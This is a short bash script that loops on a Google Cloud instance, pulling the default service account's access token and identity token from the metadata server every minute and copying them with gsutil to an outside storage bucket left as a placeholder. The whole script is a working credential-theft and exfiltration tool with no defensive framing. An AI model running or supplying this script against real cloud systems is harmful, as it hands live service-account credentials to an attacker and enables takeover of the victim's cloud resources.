#!/bin/bash
while true
do
    email=`curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email`
    curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -o /tmp/$email
    gsutil cp /tmp/$email gs://YOURBUCKETNAMEHERE
    curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=32555940559.apps.googleusercontent.com -o /tmp/$email-identity
    gsutil cp /tmp/$email-identity gs://YOURBUCKETNAMEHERE
    rm /tmp/$email
    sleep 60
done
